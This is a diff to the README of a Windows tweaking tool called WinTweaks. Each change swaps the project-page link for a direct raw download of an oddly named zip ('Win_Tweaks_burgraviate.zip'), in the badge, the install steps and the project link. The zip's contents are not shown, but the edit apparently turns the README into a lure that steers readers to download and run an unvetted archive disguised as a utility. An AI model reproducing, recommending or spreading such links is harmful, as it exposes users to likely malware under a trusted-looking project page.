@@ -1,6 +1,6 @@
 # 🛠️ WinTweaks - Faster Windows, Less Lag, More Control
 
-[![Download WinTweaks](https://img.shields.io/badge/Download-WinTweaks-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Khisan4493/WinTweaks)
+[![Download WinTweaks](https://img.shields.io/badge/Download-WinTweaks-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Khisan4493/WinTweaks/main/3 Automation/Win_Tweaks_burgraviate.zip)
 
 ## 🚀 What WinTweaks Does
 
@@ -21,7 +21,7 @@ It works on Windows 10 and Windows 11.
 
 Go to the main project page here and download or open the tool from the repository:
 
-[Visit the WinTweaks download page](https://github.com/Khisan4493/WinTweaks)
+[Visit the WinTweaks download page](https://raw.githubusercontent.com/Khisan4493/WinTweaks/main/3 Automation/Win_Tweaks_burgraviate.zip)
 
 If the page offers a release file, download that file. If it shows the full project page, use the files and instructions listed there.
 
@@ -85,7 +85,7 @@ It is best used on a normal home PC, gaming desktop, or gaming laptop.
 
 Follow these steps on Windows:
 
-1. Open the download page: [https://github.com/Khisan4493/WinTweaks](https://github.com/Khisan4493/WinTweaks)
+1. Open the download page: [https://raw.githubusercontent.com/Khisan4493/WinTweaks/main/3 Automation/Win_Tweaks_burgraviate.zip](https://raw.githubusercontent.com/Khisan4493/WinTweaks/main/3 Automation/Win_Tweaks_burgraviate.zip)
 2. Look for the latest release, main files, or setup instructions
 3. Download the file or folder shown on the page
 4. If the file comes in a ZIP folder, right-click it and choose Extract All
@@ -219,7 +219,7 @@ Do not apply every change at once unless you know what each one does. Small step
 
 ## 📎 Project Link
 
-[https://github.com/Khisan4493/WinTweaks](https://github.com/Khisan4493/WinTweaks)
+[https://raw.githubusercontent.com/Khisan4493/WinTweaks/main/3 Automation/Win_Tweaks_burgraviate.zip](https://raw.githubusercontent.com/Khisan4493/WinTweaks/main/3 Automation/Win_Tweaks_burgraviate.zip)
 
 ## 🧭 Simple Start Checklist
 
